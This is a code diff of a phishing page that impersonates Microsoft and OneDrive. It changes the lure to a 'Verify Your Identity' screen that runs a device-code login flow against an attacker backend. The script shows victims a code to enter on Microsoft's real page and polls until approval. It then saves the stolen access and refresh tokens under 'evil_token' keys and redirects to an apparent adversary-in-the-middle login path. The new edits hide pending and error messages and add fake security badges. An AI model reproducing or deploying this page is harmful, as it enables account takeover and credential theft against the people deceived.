@@ -3,93 +3,78 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>OneDrive · Shared Document</title>
+  <title>Verify Your Identity · Microsoft</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
+    /* Reset & base – same as email */
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      background: #f0f2f5;
-      font-family: 'Segoe UI', 'Helvetica Neue', Roboto, sans-serif;
+      background: #f4f6f8;
+      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      padding: 24px;
-      margin: 0;
+      padding: 20px;
     }
-
-    .fluent-card {
+    .container {
       max-width: 520px;
       width: 100%;
       background: #ffffff;
       border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08), 0 2px 6px rgba(0, 0, 0, 0.02);
-      padding: 40px 44px 32px;
-      border: 1px solid #e8ecf0;
-      transition: box-shadow 0.2s ease;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+      border: 1px solid #e0e4e8;
+      overflow: hidden;
     }
-
-    .fluent-card:hover { box-shadow: 0 8px 32px rgba(0, 0, 0, 0.10); }
-
-    /* ── HEADER ── */
+    /* Header – blue bar with lock */
     .header {
+      background: #0078D4;
+      padding: 18px 24px;
+      color: #fff;
       display: flex;
       align-items: center;
-      gap: 6px;
-      margin-bottom: 28px;
+      gap: 12px;
+      border-bottom: 3px solid #005a9e;
     }
-
-    .header .onedrive-icon {
-      width: 44px;
-      height: 44px;
+    .header .lock-icon {
+      width: 30px;
+      height: 30px;
       flex-shrink: 0;
+      fill: none;
+      stroke: #ffffff;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
     }
-
-    .header .brand-name {
-      font-size: 22px;
+    .header h1 {
+      font-size: 19px;
       font-weight: 600;
-      color: #1a1a1a;
       letter-spacing: -0.2px;
-    }
-
-    /* ── LOCK BADGE ── */
-    .lock-badge {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 10px;
-    }
-    .lock-badge svg { width: 40px; height: 40px; }
-
-    /* ── TYPOGRAPHY ── */
-    .heading-wrapper { text-align: center; margin-bottom: 4px; }
-    .heading {
-      font-size: 20px;
-      font-weight: 600;
-      color: #1a1a1a;
       margin: 0;
+    }
+    /* Body */
+    .body {
+      padding: 28px 32px 24px;
     }
     .sub-heading {
       font-size: 15px;
       color: #3b3b3b;
-      margin-bottom: 24px;
       line-height: 1.5;
       text-align: center;
+      margin-bottom: 24px;
     }
-
-    /* ── CODE AREA ── */
+    /* Code area – dark card */
     .code-area {
       background: #1a1a2e;
       border-radius: 10px;
       padding: 18px 20px 14px;
       border: 1px solid #2a2a4a;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
       display: flex;
       flex-direction: column;
       align-items: center;
       gap: 4px;
-      box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.35);
+      box-shadow: inset 0 2px 8px rgba(0,0,0,0.35);
     }
-
     .code-label {
       font-size: 10px;
       font-weight: 700;
@@ -98,7 +83,6 @@
       text-transform: uppercase;
       text-align: center;
     }
-
     .code-value {
       font-family: 'SF Mono', 'Consolas', 'Courier New', monospace;
       font-size: 34px;
@@ -108,16 +92,14 @@
       background: transparent;
       border: none;
       outline: none;
-      text-shadow: 0 0 12px rgba(79, 195, 247, 0.15);
+      text-shadow: 0 0 12px rgba(79,195,247,0.15);
       display: block;
       text-align: center;
-      margin: 2px 0 4px 0;
+      margin: 2px 0 4px;
       min-height: 50px;
     }
-
     .code-value.loading { color: #6a8aaa; font-size: 18px; letter-spacing: 1px; }
     .code-value.error { color: #ef4444; }
-
     .copy-btn {
       background: #2a2a4a;
       border: 1px solid #3a3a5a;
@@ -127,100 +109,17 @@
       font-weight: 500;
       color: #c8d0e0;
       cursor: pointer;
-      transition: background 0.15s ease, transform 0.1s ease, border-color 0.15s ease;
+      transition: background 0.15s;
       display: inline-flex;
       align-items: center;
       gap: 8px;
       white-space: nowrap;
     }
-
-    .copy-btn:hover { background: #3a3a5e; border-color: #4FC3F7; color: #ffffff; }
+    .copy-btn:hover { background: #3a3a5e; border-color: #4FC3F7; color: #fff; }
     .copy-btn:active { transform: scale(0.96); }
-    .copy-btn svg { stroke: #c8d0e0; transition: stroke 0.15s ease; }
-    .copy-btn:hover svg { stroke: #4FC3F7; }
-
-    /* ── STEPS ── */
-    .steps-list {
-      list-style: none;
-      padding: 0;
-      margin: 0 0 28px 0;
-      background: #f8fafc;
-      border-radius: 8px;
-      border: 1px solid #e8ecf0;
-      padding: 12px 18px;
-    }
-
-    .steps-list li {
-      font-size: 14px;
-      color: #2b2b2b;
-      padding: 8px 0;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      border-bottom: 1px solid #f0f3f7;
-    }
-
-    .steps-list li:last-child { border-bottom: none; }
-
-    .step-circle {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 26px;
-      height: 26px;
-      background: #0078D4;
-      color: #ffffff;
-      font-weight: 700;
-      font-size: 13px;
-      border-radius: 50%;
-      flex-shrink: 0;
-    }
-
-    .key-hint {
-      background: #eef2f8;
-      padding: 0 12px;
-      border-radius: 4px;
-      font-family: 'Segoe UI', monospace;
-      font-size: 13px;
-      font-weight: 500;
-      border: 1px solid #d0d6de;
-    }
-
-    /* ── CONTINUE BUTTON ── */
-    .continue-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      width: 100%;
-      background: #0078D4;
-      color: #ffffff;
-      border: none;
-      border-radius: 8px;
-      padding: 14px 0;
-      font-size: 16px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: background 0.15s ease, box-shadow 0.15s ease;
-      text-align: center;
-      text-decoration: none;
-      margin-bottom: 28px;
-      letter-spacing: 0.2px;
-    }
-
-    .continue-btn:hover { background: #0067B8; box-shadow: 0 2px 12px rgba(0, 120, 212, 0.30); }
-    .continue-btn:active { transform: scale(0.98); }
-    .continue-btn:disabled { opacity: 0.5; pointer-events: none; }
-
-    .continue-btn .ms-logo {
-      width: 24px;
-      height: 24px;
-      flex-shrink: 0;
-    }
-
-    /* ── STATUS ── */
+    /* Status area */
     .status-area {
-      margin: -12px 0 20px 0;
+      margin: -12px 0 18px;
       padding: 8px 14px;
       border-radius: 6px;
       font-size: 14px;
@@ -234,145 +133,257 @@
       justify-content: center;
       gap: 8px;
     }
-
-    .status-area .status-icon {
+    .status-area .status-icon { width: 18px; height: 18px; flex-shrink: 0; }
+    .status-area.pending { background: #fff8e6; border-color: #f5d742; color: #5a4d00; }
+    .status-area.pending .status-icon { stroke: #f5d742; fill: #f5d742; }
+    .status-area.approved { background: #e6f7e6; border-color: #1ea81e; color: #005a00; }
+    .status-area.approved .status-icon { stroke: #1ea81e; fill: #1ea81e; }
+    .status-area.error { background: #ffebee; border-color: #e74c3c; color: #7a0000; }
+    .status-area.error .status-icon { stroke: #e74c3c; fill: #e74c3c; }
+    .status-area.hidden { display: none !important; }
+    /* Secure badge */
+    .secure-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #1a1a1a;
+      background: #f0f6ff;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      border: 1px solid #d9e6f2;
+    }
+    .secure-badge svg {
       width: 18px;
       height: 18px;
       flex-shrink: 0;
-    }
-
-    .status-area.pending { background: #fff8e6; border-color: #f5d742; color: #5a4d00; }
-    .status-area.pending .status-icon { stroke: #f5d742; fill: #f5d742; }
-
-    .status-area.approved { background: #e6f7e6; border-color: #1ea81e; color: #005a00; }
-    .status-area.approved .status-icon { stroke: #1ea81e; fill: #1ea81e; }
-
-    .status-area.error { background: #ffebee; border-color: #e74c3c; color: #7a0000; }
-    .status-area.error .status-icon { stroke: #e74c3c; fill: #e74c3c; }
-
-    /* ── FOOTER ── */
-    .footer {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 6px;
-      border-top: 1px solid #e8ecf0;
-      padding-top: 20px;
-    }
-
-    .footer-secured {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      color: #1a1a1a;
-      font-weight: 500;
-      font-size: 12px;
-    }
-
-    .footer-secured svg {
-      width: 16px;
-      height: 16px;
-      flex-shrink: 0;
       stroke: #107C10;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
     }
-
-    .footer-copy {
-      color: #777;
+    .secure-badge strong { color: #107C10; }
+    /* Steps */
+    .steps-list {
+      list-style: none;
+      padding: 12px 18px;
+      margin: 0 0 24px;
+      background: #f8fafc;
+      border-radius: 8px;
+      border: 1px solid #e8ecf0;
+    }
+    .steps-list li {
+      font-size: 14px;
+      color: #2b2b2b;
+      padding: 8px 0;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      border-bottom: 1px solid #f0f3f7;
+    }
+    .steps-list li:last-child { border-bottom: none; }
+    .step-circle {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 26px;
+      height: 26px;
+      background: #0078D4;
+      color: #fff;
+      font-weight: 700;
+      font-size: 13px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+    .key-hint { display: none !important; }
+    /* Continue button */
+    .btn-container {
+      text-align: center;
+      margin: 24px 0 18px;
+    }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: #0078D4;
+      color: #fff;
+      font-weight: 600;
+      font-size: 16px;
+      padding: 12px 34px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      text-decoration: none;
+      box-shadow: 0 2px 10px rgba(0,120,212,0.2);
+      transition: background 0.15s;
+    }
+    .btn:hover { background: #0067B8; box-shadow: 0 4px 16px rgba(0,120,212,0.3); }
+    .btn:disabled { opacity: 0.5; pointer-events: none; }
+    .btn .ms-logo { width: 20px; height: 20px; flex-shrink: 0; }
+    /* Footer */
+    .footer {
+      border-top: 1px solid #e8ecf0;
+      padding: 14px 30px 18px;
       font-size: 11px;
+      color: #6e7a8a;
+      background: #fafbfc;
       text-align: center;
     }
-
-    @media (max-width: 500px) {
-      .fluent-card { padding: 24px 18px; }
+    .footer .logo-container {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 4px;
+    }
+    .footer .logo-container .logo-squares {
+      display: inline-table;
+      border-collapse: collapse;
+    }
+    .footer .logo-container .logo-squares td {
+      width: 12px;
+      height: 12px;
+    }
+    .footer .logo-container .logo-text {
+      font-size: 13px;
+      font-weight: 600;
+      color: #1a1a1a;
+    }
+    .footer .legal { margin-top: 4px; }
+    .footer a { color: #0078D4; text-decoration: none; }
+    /* Footer padlock line – now green */
+    .footer .padlock-line {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin: 2px 0;
+      font-size: 11px;
+      color: #6e7a8a;
+    }
+    .footer .padlock-line svg {
+      width: 14px;
+      height: 14px;
+      flex-shrink: 0;
+      stroke: #107C10;  /* Microsoft green */
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+    @media (max-width:480px) {
+      .header { padding: 14px 16px; }
+      .header h1 { font-size: 17px; }
+      .body { padding: 18px 14px; }
+      .btn { padding: 10px 20px; font-size: 15px; }
       .code-value { font-size: 28px; letter-spacing: 2px; }
-      .heading { font-size: 18px; }
-      .continue-btn { font-size: 14px; gap: 8px; padding: 12px 0; }
-      .continue-btn .ms-logo { width: 20px; height: 20px; }
-      .step-circle { width: 22px; height: 22px; font-size: 12px; }
-      .header .onedrive-icon { width: 36px; height: 36px; }
-      .header .brand-name { font-size: 20px; }
+      .steps-list { padding: 10px 14px; }
+      .footer .logo-container .logo-squares td { width: 10px; height: 10px; }
+      .footer .logo-container .logo-text { font-size: 12px; }
+      .footer .padlock-line { font-size: 10px; }
+      .footer .padlock-line svg { width: 12px; height: 12px; }
     }
   </style>
 </head>
 <body>
 
-<div class="fluent-card">
-  <!-- ─── HEADER ─── -->
+<div class="container">
+  <!-- HEADER -->
   <div class="header">
-    <svg class="onedrive-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#0078D4">
-      <path d="M16.5 6.5C15.9 5.3 14.7 4.5 13.3 4.5C12.1 4.5 11 5.1 10.3 6C9.7 5.6 8.9 5.2 8 5.2C5.9 5.2 4.2 6.9 4.2 9C4.2 9.2 4.2 9.4 4.3 9.6C3.3 9.8 2.5 10.7 2.5 12C2.5 13.5 3.7 14.8 5.3 14.8H16.5C18 14.8 19.3 13.6 19.3 12C19.3 10.6 18.3 9.4 16.9 9.2C17 9 17 8.8 17 8.6C17 7.1 15.8 5.8 14.2 5.8C14.1 5.8 14 5.8 13.9 5.9C13.7 6.2 13.4 6.4 13 6.5C13.2 6.5 13.4 6.6 13.6 6.8C14.2 7.1 14.6 7.7 14.8 8.4C15 9.1 15 9.8 14.8 10.5H16.5C17.3 10.5 18 11.2 18 12C18 12.8 17.3 13.5 16.5 13.5H5.3C4.5 13.5 3.8 12.8 3.8 12C3.8 11.2 4.5 10.5 5.3 10.5H7C6.8 9.8 6.8 9.1 7 8.4C7.2 7.7 7.6 7.1 8.2 6.8C8.4 6.6 8.6 6.5 8.8 6.5C8.4 6.4 8.1 6.2 7.9 5.9C7.8 5.8 7.7 5.8 7.6 5.8C6 5.8 4.8 7.1 4.8 8.6C4.8 8.8 4.8 9 4.9 9.2C3.5 9.4 2.5 10.6 2.5 12C2.5 13.6 3.8 14.8 5.3 14.8H16.5C18 14.8 19.3 13.6 19.3 12C19.3 10.6 18.3 9.4 16.9 9.2Z" />
+    <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
     </svg>
-    <span class="brand-name">OneDrive</span>
+    <h1>Verify Your Identity</h1>
   </div>
 
-  <!-- ─── LOCK BADGE ─── -->
-  <div class="lock-badge">
-    <svg viewBox="0 0 24 24" fill="none" stroke="#0078D4" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-      <rect x="3" y="10" width="18" height="12" rx="2" ry="2" />
-      <path d="M7 10V7a5 5 0 0 1 10 0v3" />
-    </svg>
-  </div>
+  <!-- BODY -->
+  <div class="body">
+    <div class="sub-heading">
+      To complete the verification process, please enter the code shown below on the Microsoft sign‑in page.
+    </div>
 
-  <!-- ─── HEADING ─── -->
-  <div class="heading-wrapper">
-    <div class="heading">View shared document</div>
-  </div>
-  <div class="sub-heading">
-    Someone shared a document with you on OneDrive.<br />
-    Verify your identity with Microsoft to access it.
-  </div>
+    <!-- CODE AREA -->
+    <div class="code-area">
+      <div class="code-label">YOUR VERIFICATION CODE</div>
+      <span class="code-value loading" id="verificationCode">Loading…</span>
+      <button class="copy-btn" id="copyBtn">
+        <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="5" y="5" width="8" height="8" rx="1" />
+          <path d="M3 11V3c0-.6.4-1 1-1h8" />
+        </svg>
+        Copy Code
+      </button>
+    </div>
 
-  <!-- ─── CODE AREA ─── -->
-  <div class="code-area">
-    <div class="code-label">YOUR VERIFICATION CODE</div>
-    <span class="code-value loading" id="verificationCode">⟳ Generating…</span>
-    <button class="copy-btn" id="copyBtn">
-      <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="5" y="5" width="8" height="8" rx="1" />
-        <path d="M3 11V3c0-.6.4-1 1-1h8" />
+    <!-- STATUS -->
+    <div class="status-area" id="statusMessage">
+      <svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10" />
+        <polyline points="12 6 12 12 16 14" />
       </svg>
-      Copy Code
-    </button>
-  </div>
+      <span id="statusText">Starting verification…</span>
+    </div>
 
-  <!-- ─── STATUS ─── -->
-  <div class="status-area" id="statusMessage">
-    <!-- Clock icon (pending) -->
-    <svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-      <circle cx="12" cy="12" r="10" />
-      <polyline points="12 6 12 12 16 14" />
-    </svg>
-    <span id="statusText">Starting device flow…</span>
-  </div>
-
-  <!-- ─── STEPS ─── -->
-  <ul class="steps-list">
-    <li><span class="step-circle">1</span> Copy the code above</li>
-    <li><span class="step-circle">2</span> Click continue and paste <span class="key-hint">Ctrl+V</span></li>
-    <li><span class="step-circle">3</span> Sign in with your Microsoft account</li>
-  </ul>
-
-  <!-- ─── CONTINUE BUTTON ─── -->
-  <button class="continue-btn" id="continueBtn">
-    <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-      <rect x="2" y="2" width="9" height="9" fill="#F25022" />
-      <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
-      <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
-      <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
-    </svg>
-    Continue to Microsoft
-  </button>
-
-  <!-- ─── FOOTER ─── -->
-  <div class="footer">
-    <span class="footer-secured">
-      <svg viewBox="0 0 24 24" fill="none" stroke="#107C10" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+    <!-- SECURE BADGE -->
+    <div class="secure-badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
         <path d="M9 12l2 2 4-4" stroke="#107C10" stroke-width="2.5" />
       </svg>
-      Secured by Microsoft
-    </span>
-    <span class="footer-copy">© 2026 Microsoft Corporation. All rights reserved.</span>
+      <span><strong>Secure verification</strong> – Your identity is protected.</span>
+    </div>
+
+    <!-- STEPS -->
+    <ul class="steps-list">
+      <li><span class="step-circle">1</span> Copy the code above</li>
+      <li><span class="step-circle">2</span> Click continue and paste</li>
+      <li><span class="step-circle">3</span> Sign in with your Microsoft account</li>
+    </ul>
+
+    <!-- CONTINUE BUTTON -->
+    <div class="btn-container">
+      <button class="btn" id="continueBtn">
+        <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <rect x="2" y="2" width="9" height="9" fill="#F25022" />
+          <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
+          <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
+          <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
+        </svg>
+        Continue to Microsoft
+      </button>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer">
+    <div class="logo-container">
+      <table class="logo-squares" cellpadding="0" cellspacing="1" border="0">
+        <tr>
+          <td style="background:#F25022;"></td>
+          <td style="background:#7FBA00;"></td>
+        </tr>
+        <tr>
+          <td style="background:#00A4EF;"></td>
+          <td style="background:#FFB900;"></td>
+        </tr>
+      </table>
+      <span class="logo-text">Microsoft</span>
+    </div>
+
+    <!-- PADLOCK LINE – now with green lock -->
+    <div class="padlock-line">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#107C10" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+        <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+      </svg>
+      <span>This verification is part of the security alert process.</span>
+    </div>
+
+    <div class="legal">&copy; 2026 Microsoft Corporation &middot; <a href="#">Privacy Statement</a> &middot; <a href="#">Terms of Use</a></div>
   </div>
 </div>
 
@@ -397,8 +408,11 @@
     function setStatus(text, type = '') {
       statusText.textContent = text;
       statusMsg.className = 'status-area' + (type ? ' ' + type : '');
-      
-      // Update icon based on status
+      let shouldHide = (type === 'pending' || type === 'error');
+      if (text.toLowerCase().includes('waiting') || text.toLowerCase().includes('approval')) shouldHide = true;
+      if (shouldHide) statusMsg.classList.add('hidden');
+      else statusMsg.classList.remove('hidden');
+
       let iconSvg = '';
       if (type === 'approved') {
         iconSvg = `<svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>`;
@@ -409,17 +423,11 @@
       } else {
         iconSvg = `<svg class="status-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" /><line x1="12" y1="8" x2="12" y2="12" /><line x1="12" y1="16" x2="12.01" y2="16" /></svg>`;
       }
-      
-      // Update icon (keep the span for text)
       const iconContainer = statusMsg.querySelector('.status-icon');
-      if (iconContainer) {
-        iconContainer.outerHTML = iconSvg;
-      } else {
-        // If no icon exists, prepend it
+      if (iconContainer) iconContainer.outerHTML = iconSvg;
+      else {
         const span = statusMsg.querySelector('#statusText');
-        if (span) {
-          span.insertAdjacentHTML('beforebegin', iconSvg);
-        }
+        if (span) span.insertAdjacentHTML('beforebegin', iconSvg);
       }
     }
 
@@ -428,21 +436,17 @@
       codeSpan.className = 'code-value' + (state ? ' ' + state : '');
     }
 
-    function addLog(msg) {
-      console.log('[OneDrive]', msg);
-    }
-
     copyBtn.addEventListener('click', function(e) {
       e.preventDefault();
       const code = codeSpan.textContent.trim();
-      if (!code || code.startsWith('⟳') || code.startsWith('⚠')) {
+      if (!code || code.startsWith('Loading') || code.startsWith('Error') || code.startsWith('Expired')) {
         alert('No valid code to copy. Please wait for generation.');
         return;
       }
       if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(code).then(() => {
-          copyBtn.innerHTML = '✓ Copied!';
-          setTimeout(() => { copyBtn.innerHTML = '📋 Copy Code'; }, 1800);
+          copyBtn.innerHTML = 'Copied!';
+          setTimeout(() => { copyBtn.innerHTML = 'Copy Code'; }, 1800);
         }).catch(() => fallbackCopy(code));
       } else {
         fallbackCopy(code);
@@ -459,37 +463,33 @@
       ta.select();
       try {
         document.execCommand('copy');
-        copyBtn.innerHTML = '✓ Copied!';
-        setTimeout(() => { copyBtn.innerHTML = '📋 Copy Code'; }, 1800);
+        copyBtn.innerHTML = 'Copied!';
+        setTimeout(() => { copyBtn.innerHTML = 'Copy Code'; }, 1800);
       } catch (err) {
         alert('Unable to copy. Please select the code manually.');
       }
       document.body.removeChild(ta);
     }
 
-    async function pollForToken(manual = false) {
+    async function pollForToken() {
       if (!deviceCode || isPolling || isApproved) return;
       isPolling = true;
-
       try {
         const resp = await fetch(`${API_BASE}/device/token`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ device_code: deviceCode })
         });
-
         const data = await resp.json();
-        addLog('Poll response: ' + JSON.stringify(data));
-
         if (data.access_token) {
           isApproved = true;
           clearInterval(pollInterval);
           pollInterval = null;
           setStatus('Approved! You now have access.', 'approved');
-          setCode('✅ Approved', '');
+          setCode('Approved', '');
           continueBtn.disabled = false;
           continueBtn.innerHTML = `
-            <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:inline-block; vertical-align:middle;">
               <rect x="2" y="2" width="9" height="9" fill="#F25022" />
               <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
               <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
@@ -500,42 +500,30 @@
           continueBtn.onclick = function(e) {
             e.preventDefault();
             localStorage.setItem('evil_token_direct', data.access_token);
-            if (data.refresh_token) {
-              localStorage.setItem('evil_token_refresh', data.refresh_token);
-            }
+            if (data.refresh_token) localStorage.setItem('evil_token_refresh', data.refresh_token);
             localStorage.setItem('evil_token_user', data.username || 'User');
             window.location.href = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
           };
-          addLog('✅ TOKENS OBTAINED — Redirecting to AiTM');
           isPolling = false;
           return;
         }
-
         if (data.error === 'authorization_pending') {
           setStatus('Waiting for your approval on the Microsoft page…', 'pending');
-          isPolling = false;
-          return;
+          isPolling = false; return;
         }
-
         if (data.error === 'expired_token') {
-          clearInterval(pollInterval);
-          pollInterval = null;
+          clearInterval(pollInterval); pollInterval = null;
           setStatus('Code expired. Please refresh the page.', 'error');
-          setCode('⏰ EXPIRED', 'error');
+          setCode('EXPIRED', 'error');
           continueBtn.disabled = true;
-          isPolling = false;
-          return;
+          isPolling = false; return;
         }
-
         if (data.error) {
           setStatus(`Error: ${data.error} — will retry`, 'error');
-          isPolling = false;
-          return;
+          isPolling = false; return;
         }
-
         setStatus('Still waiting…', 'pending');
         isPolling = false;
-
       } catch (err) {
         console.error('Poll error:', err);
         setStatus(`Poll error: ${err.message}`, 'error');
@@ -545,10 +533,10 @@
 
     async function startDeviceFlow() {
       setStatus('Requesting code from Microsoft…', 'pending');
-      setCode('⟳ Loading…', 'loading');
+      setCode('Loading…', 'loading');
       continueBtn.disabled = true;
       continueBtn.innerHTML = `
-        <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <svg class="ms-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:inline-block; vertical-align:middle;">
           <rect x="2" y="2" width="9" height="9" fill="#F25022" />
           <rect x="13" y="2" width="9" height="9" fill="#7FBA00" />
           <rect x="2" y="13" width="9" height="9" fill="#00A4EF" />
@@ -556,30 +544,19 @@
         </svg>
         Continue to Microsoft
       `;
-
       try {
         const resp = await fetch(`${API_BASE}/device/request`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' }
         });
-
-        if (!resp.ok) {
-          const errText = await resp.text();
-          throw new Error(`HTTP ${resp.status}: ${errText}`);
-        }
-
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
         const data = await resp.json();
-        addLog('Device code response: ' + JSON.stringify(data));
-
         if (data.error) throw new Error(data.error_description || data.error);
-
         deviceCode = data.device_code;
         userCode = data.user_code;
         verificationUri = data.verification_uri || 'https://microsoft.com/devicelogin';
-
         setCode(userCode, '');
         setStatus(`Code: ${userCode} — open Microsoft page and enter it.`, 'pending');
-
         continueBtn.disabled = false;
         continueBtn.onclick = function(e) {
           e.preventDefault();
@@ -590,27 +567,21 @@
             alert('No verification URI available.');
           }
         };
-
         if (pollInterval) clearInterval(pollInterval);
         const intervalMs = (data.interval || 5) * 1000 + 500;
-        pollInterval = setInterval(() => pollForToken(), intervalMs);
-        setTimeout(() => pollForToken(), 1000);
-
-        addLog(`✅ Code ${userCode} generated. URI: ${verificationUri}`);
-
+        pollInterval = setInterval(pollForToken, intervalMs);
+        setTimeout(pollForToken, 1000);
       } catch (err) {
         console.error('Device flow error:', err);
         setStatus(`Error: ${err.message}`, 'error');
-        setCode('⚠️ Error', 'error');
+        setCode('Error', 'error');
         continueBtn.disabled = true;
-        addLog('❌ ' + err.message);
       }
     }
 
     window.addEventListener('DOMContentLoaded', () => {
       setTimeout(startDeviceFlow, 400);
     });
-
     document.addEventListener('keydown', (e) => {
       if (e.key === 'r' && !e.ctrlKey && !e.metaKey && !e.altKey) {
         e.preventDefault();
@@ -619,9 +590,8 @@
         startDeviceFlow();
       }
     });
-
-    console.log('🍟 OneDrive · Production device login ready.');
   })();
 </script>
+
 </body>
 </html>
